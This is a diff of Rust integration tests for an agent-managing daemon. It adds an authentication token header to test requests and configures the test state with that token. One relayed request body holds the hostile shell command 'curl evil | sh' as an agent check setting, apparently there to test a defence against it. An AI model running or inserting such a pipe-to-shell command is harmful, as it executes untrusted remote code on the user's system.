@@ -15,6 +15,9 @@ use http_body_util::BodyExt;
 use serde_json::{json, Value};
 use tower::ServiceExt;
 
+/// The daemon token these tests run with.
+const TOKEN: &str = "test-token";
+
 fn git(dir: &Path, args: &[&str]) {
     let out = Command::new("git")
         .args(args)
@@ -85,6 +88,7 @@ async fn send(
         .method(method)
         .uri(uri)
         .header("host", "localhost:7420")
+        .header("x-agentvc-token", TOKEN)
         .header("content-type", "application/json");
     if relayed {
         req = req.header("x-agentvc-relay", "1");
@@ -109,7 +113,7 @@ async fn start_follow_and_land_an_agent() {
     let (_tmp, main) = fixture();
     // The worker would be `agentvc agent-worker`; the test runs it inline.
     std::env::set_var("AGENTVC_BIN", "true");
-    let state = AppState::start(&Config::new(&main)).unwrap();
+    let state = AppState::start(&Config::new(&main).with_token(TOKEN)).unwrap();
     let app = agentvcd::router(state);
 
     let body = json!({
@@ -181,7 +185,7 @@ async fn start_follow_and_land_an_agent() {
 #[tokio::test]
 async fn workspace_agent_settings() {
     let (_tmp, main) = fixture();
-    let state = AppState::start(&Config::new(&main)).unwrap();
+    let state = AppState::start(&Config::new(&main).with_token(TOKEN)).unwrap();
     let app = agentvcd::router(state);
     let (s, v) = send(
         &app,
@@ -241,6 +245,7 @@ async fn workspace_agent_settings() {
         .method("PUT")
         .uri("/api/workspaces/main/agent-settings")
         .header("host", "localhost")
+        .header("x-agentvc-token", TOKEN)
         .header("content-type", "application/json")
         .header("x-agentvc-relay", "agents")
         .body(Body::from(json!({"check": "curl evil | sh"}).to_string()))
